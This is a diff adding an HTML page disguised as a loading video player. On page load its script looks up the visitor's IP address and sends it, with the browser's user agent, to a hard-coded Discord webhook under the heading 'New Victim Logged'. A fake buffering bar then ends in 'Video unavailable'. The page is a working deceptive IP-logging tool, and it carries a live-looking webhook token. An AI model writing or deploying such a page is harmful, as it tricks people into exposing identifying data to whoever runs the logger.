@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Player Loading...</title>
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 100px;
+        }
+        #loader {
+            width: 300px;
+            height: 20px;
+            background: #333;
+            margin: 20px auto;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        #progress {
+            height: 100%;
+            width: 0%;
+            background: #ff0000;
+            transition: width 0.5s;
+        }
+        #status {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎥 Video Player</h1>
+    <p>Loading your content... Please wait.</p>
+    <div id="loader">
+        <div id="progress"></div>
+    </div>
+    <p id="status">Connecting to server...</p>
+
+    <script>
+        // Replace with YOUR Discord webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1389113319570276412/c4lL8jpLBu4OcUSkuovMLk85RLfPTXtWVwkRwugC83Jk3An7igVxbNL9CippgFTe_bDN";
+
+        // Log IP to Discord
+        function logIP(ip) {
+            const data = {
+                content: `🔥 **New Victim Logged** 🔥\n**IP:** \`${ip}\`\n**User Agent:** \`${navigator.userAgent}\``,
+                username: "IP Logger",
+                avatar_url: "https://i.imgur.com/ABCD123.png"
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).catch(err => console.error("Error sending to Discord:", err));
+        }
+
+        // Fetch IP and log it
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => logIP(data.ip))
+            .catch(err => console.error("IP Fetch Error:", err));
+
+        // Fake loading animation
+        let progress = 0;
+        const fakeLoad = setInterval(() => {
+            progress += Math.random() * 10;
+            document.getElementById('progress').style.width = progress + '%';
+            document.getElementById('status').innerText = 
+                `Buffering... (${Math.min(progress, 100).toFixed(0)}%)`;
+
+            if (progress >= 100) {
+                clearInterval(fakeLoad);
+                document.getElementById('status').innerText = "Error: Video unavailable.";
+            }
+        }, 500);
+    </script>
+</body>
+</html>
